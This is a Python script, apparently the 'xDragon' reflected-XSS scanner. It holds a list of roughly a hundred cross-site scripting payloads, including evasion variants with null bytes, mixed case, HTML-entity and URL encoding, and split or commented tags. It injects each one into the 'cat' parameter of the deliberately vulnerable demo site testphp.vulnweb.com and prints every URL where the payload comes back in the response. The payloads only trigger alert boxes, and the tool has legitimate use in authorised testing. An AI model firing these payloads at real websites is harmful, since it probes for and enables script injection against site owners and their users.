import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

xss_payloads = [
    '<script>alert(1)</script>',  
    '"><script>alert(1)</script>',  
    '<img src=x onerror=alert(1)>',  
    '"><img src=x onerror=alert(1)>',  
    '<svg/onload=alert(1)>',  
    '"><svg/onload=alert(1)>', 
    '><script>alert(1)</script>',
    '"><scr\0ipt>alert(1)</scr\0ipt>',
    '"><scr\00ipt>alert(1)</scr\00ipt>',
    '"><scr\000ipt>alert(1)</scr\000ipt>',
    '"><scri%00pt>alert(1)</scri%00pt>',
    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
    '"><scri%2525pt>alert(1)</scri%2525pt>',
    '"><scri+pt>alert(1)</scr+ipt>',
    '"><scri%2bpt>alert(1)</scr%2bipt>',
    '"><sc%00ript>alert(1)</sc%00ript>',
    '"><img src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)>',
    '"><body onload=alert(1)>',
    '"><input type=text onfocus=alert(1) autofocus>',
    '"><button onclick=alert(1)>Click</button>',
    '"><video src=x onerror=alert(1)>',
    '"><audio src=x onerror=alert(1)>',
    '"><iframe src=javascript:alert(1)>',
    '"><form action=javascript:alert(1)>',
    '"><textarea onfocus=alert(1) autofocus></textarea>',
    '"><scr<script>ipt>alert(1)</scr</script>ipt>',
    '"><img src=x onerror="</script><script>alert(1)</script>">',
    '"><scri<script>pt>alert(1)</scri</script>pt>',
    '"><scri</scri><script>pt>alert(1)</script>',
    '"><scri\0pt><script>alert(1)</script></scri\0pt>',
    '"><scri%00pt><script>alert(1)</script></scri%00pt>',
    '"><scri&#x70;t><script>alert(1)</script></scri&#x70;t>',
    '"><sc\0ript>alert(1)</sc\0ript>',
    '"><sc%00ript>alert(1)</sc%00ript>',
    '"><sc&#x70;ript>alert(1)</sc&#x70;ript>',
    '"><SCript>alert(1)</SCript>',
    '"><ScRipT>alert(1)</ScRipT>',
    '"><ScRiPt>alert(1)</ScRiPt>',
    '"><SCRipt>alert(1)</SCRipt>',
    '"><scrIPt>alert(1)</scrIPt>',
    '"><ScrIPT>alert(1)</ScrIPT>',
    '"><scRIPT>alert(1)</scRIPT>',
    '"><sCRIPT>alert(1)</sCRIPT>',
    '"><ScRiPt>alert(1)</ScRiPt>',
    '"><SCRIpt>alert(1)</SCRIpt>',
    '"><scri<!-- -->pt>alert(1)</scri<!-- -->pt>',
    '"><scri/* */pt>alert(1)</scri/* */pt>',
    '"><scri/**/pt>alert(1)</scri/**/pt>',
    '"><scri<!-- this is a comment -->pt>alert(1)</scri<!-- this is a comment -->pt>',
    '"><scri/* this is a comment */pt>alert(1)</scri/* this is a comment */pt>',
    '"><scri/**/pt>alert(1)</scri/**/pt>',
    '"><scri%00pt>alert(1)</scri%00pt>',
    '"><scri%2bpt>alert(1)</scri%2bpt>',
    '"><scri%2525pt>alert(1)</scri%2525pt>',
    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
    '"><script>alert(1)</script>',
    '"><script>alert&#40;1&#41;</script>',
    '"><script>alert&#x28;1&#x29;</script>',
    '"><script>alert%281%29</script>',
    '"><script>alert%28%31%29</script>',
    '"><script>%61%6C%65%72%74%28%31%29</script>',
    '"><script>%61%6C%65%72%74&#x28;1&#x29;</script>',
    '"><script>alert(1)//</script>',
    '"><script>alert(1)/*</script>',
    '"><script>alert(1)//comment</script>',
    '"><script>confirm(1)</script>',
    '"><script>prompt(1)</script>',
    '"><script>eval(\'alert(1)\')</script>',
    '"><script>setTimeout(\'alert(1)\', 1000)</script>',
    '"><script>setInterval(\'alert(1)\', 1000)</script>',
    '"><script>Function(\'alert(1)\')()</script>',
    '"><script>onerror=alert;throw 1</script>',
    '"><script>window.onerror=alert;throw 1</script>',
    '"><script>document.write(\'<script>alert(1)</script>\')</script>',
    '"><script>document.location=\'javascript:alert(1)\'</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    '"><input type=text onfocus=alert(1) autofocus>',
    '"><iframe src=javascript:alert(1)>',
    '"><object data=javascript:alert(1)>',
    '"><embed src=javascript:alert(1)>',
    '"><base href=javascript:alert(1)//>',
    '"><link rel=stylesheet href=javascript:alert(1)>',
    '"><meta http-equiv=refresh content="0;url=javascript:alert(1)">',
    '"><frame src=javascript:alert(1)>',
    '"><scri%00pt>alert(1)</scri%00pt>',
    '"><scri%2bpt>alert(1)</scri%2bpt>',
    '"><scri%2525pt>alert(1)</scri%2525pt>',
    '"><scri&#x70;t>alert(1)</scri&#x70;t>',
    '"><scri&#x2bpt>alert(1)</scri&#x2bpt>',
    '"><scri%25pt>alert(1)</scri%25pt>',
    '"><scri%252525pt>alert(1)</scri%252525pt>',
    '"><scri&#x2b%25pt>alert(1)</scri&#x2b%25pt>',
    '"><scri%25%2bpt>alert(1)</scri%25%2bpt>',
    '"><scri%252525%2bpt>alert(1)</scri%252525%2bpt>',
    '"><script>window </script>',
    '"><script>self </script>',
    '"><script>this </script>',
    '"><script>top </script>',
    '"><script>parent </script>',
    '"><script>frames </script>',
    '"><script>globalThis </script>',
    '"><script>Object </script>',
    '"><script>Function(\'alert(1)\')()</script>',
    '"><script>eval(\'ale\' + \'rt(1)\')</script>'
]

# Target URL
url = "http://testphp.vulnweb.com/listproducts.php?cat=3"

# Function to check for XSS in response
def check_xss(response, payload):
    soup = BeautifulSoup(response.text, 'html.parser')

    # Check if the payload is present in the response text
    if payload in response.text:
        return True

    # Check for script tags in the response
    for script in soup.find_all('script'):
        if payload in script.decode_contents():
            return True

    # Check for attributes in all tags in the response
    for tag in soup.find_all(True):
        for attr, value in tag.attrs.items():
            if isinstance(value, list):
                if any(payload in v for v in value):
                    return True
            else:
                if payload in value:
                    return True

    # Check for inline JavaScript event handlers
    for tag in soup.find_all(True):
        for attr in tag.attrs:
            if attr.startswith('on') and payload in tag.attrs[attr]:
                return True

    return False

# Function to update URL with the payload
def update_url_with_payload(url, param, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = payload
    new_query_string = urlencode(query_params, doseq=True)
    updated_url = urlunparse(parsed_url._replace(query=new_query_string))
    return updated_url

# Function to test for XSS and print all attempts
def test_for_xss(url):
    try:
        for payload in xss_payloads:
            # Update the URL with the payload
            updated_url = update_url_with_payload(url, "cat", payload)
            try:
                response = requests.get(updated_url)
                print(f"Attempt: {updated_url}")
                
                if check_xss(response, payload):
                    print(f"Vulnerable URL: {updated_url}")
                    print(f"Payload: {payload}")
                    print()
                    
            except requests.RequestException as e:
                print(f"Request failed for {updated_url}: {e}")
                time.sleep(1)  # Wait for 1 second before the next attempt
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

# Print banner
def print_banner():
    red = "\033[91m"
    reset = "\033[0m"
    banner = f"""
    {red}
                             _      _   _____   ________       ___       _________      _____     _         _
                             \.\   /./ |._'_ \  |'|.___ \     / . \     /. __'___\.\   /  '  \   |.|\.\    |.|
                              \  \  /  |.|  |.| |''   | .\   /./ \.\   /. /    ____   |. / \ .|  |.| \.\   |.|
                              /./  /   |.|  |.| |.|,-"/../  /./__ \.\  |.',   |____|  |.|   |.|  |.|  \.\  |.|
                             /./ \.\   |.|__|.| |.|\.\ .   /./ ___ \.\  \. .  . .| |  | .\ /. |  |.|   \.\ |.|
                            /./   \.\  |_____/  |.|   \.\ /./       \.\  '.__"_____;   \_____/   |.|    \.\|.|
    
                                                                                       @dragon
                                                                                       https://github.com/9rag0n/xDragon
    {reset}   
    """
    print(banner)

# Run the XSS test
if __name__ == "__main__":
    print_banner()
    test_for_xss(url)	
